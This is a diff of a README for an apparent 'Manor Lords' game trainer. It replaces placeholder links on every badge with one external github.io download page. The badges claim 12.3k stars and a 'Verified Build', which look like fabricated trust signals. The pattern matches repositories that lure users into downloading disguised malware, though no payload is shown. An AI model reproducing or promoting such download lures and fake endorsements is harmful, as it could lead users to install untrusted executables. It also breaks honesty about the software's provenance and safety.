@@ -23,10 +23,10 @@ The Trainer is designed for **single-player optimization**. It allows you to adj
 
 ---
 
-[![Activate Now](https://img.shields.io/badge/Activate-Now-red?logo=rocket\&style=for-the-badge)](#)
-[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?logo=windows\&style=for-the-badge)](#)
-[![⭐️ 12.3k Stars](https://img.shields.io/badge/GitHub-12.3k_Stars-green?logo=github\&style=for-the-badge)](#)
-[![Download](https://img.shields.io/badge/Download-Latest-brightgreen?logo=github\&style=for-the-badge)](#)
+[![Activate Now](https://img.shields.io/badge/Activate-Now-red?logo=rocket\&style=for-the-badge)](https://manor-lords-trainer.github.io/.github/)
+[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?logo=windows\&style=for-the-badge)](https://manor-lords-trainer.github.io/.github/)
+[![⭐️ 12.3k Stars](https://img.shields.io/badge/GitHub-12.3k_Stars-green?logo=github\&style=for-the-badge)](https://manor-lords-trainer.github.io/.github/)
+[![Download](https://img.shields.io/badge/Download-Latest-brightgreen?logo=github\&style=for-the-badge)](https://manor-lords-trainer.github.io/.github/)
 
 ---
 
@@ -157,8 +157,8 @@ A: Yes, use the reset hotkey or disable the trainer.
 
 The **Manor Lords Trainer** unifies **resource control, army boosts, and construction assists** into one powerful tool. Whether you want to **expand quickly, test new strategies, or skip grindy farming cycles**, this trainer ensures you rule your medieval world on your terms.
 
-[![Verified Build](https://img.shields.io/badge/Verified-Build-success?logo=github\&style=for-the-badge)](#)
-[![Community](https://img.shields.io/badge/Join-Community-purple?logo=discord\&style=for-the-badge)](#)
-[![Download](https://img.shields.io/badge/Download-Now-orange?logo=github\&style=for-the-badge)](#)
+[![Verified Build](https://img.shields.io/badge/Verified-Build-success?logo=github\&style=for-the-badge)](https://manor-lords-trainer.github.io/.github/)
+[![Community](https://img.shields.io/badge/Join-Community-purple?logo=discord\&style=for-the-badge)](https://manor-lords-trainer.github.io/.github/)
+[![Download](https://img.shields.io/badge/Download-Now-orange?logo=github\&style=for-the-badge)](https://manor-lords-trainer.github.io/.github/)
 
 ---
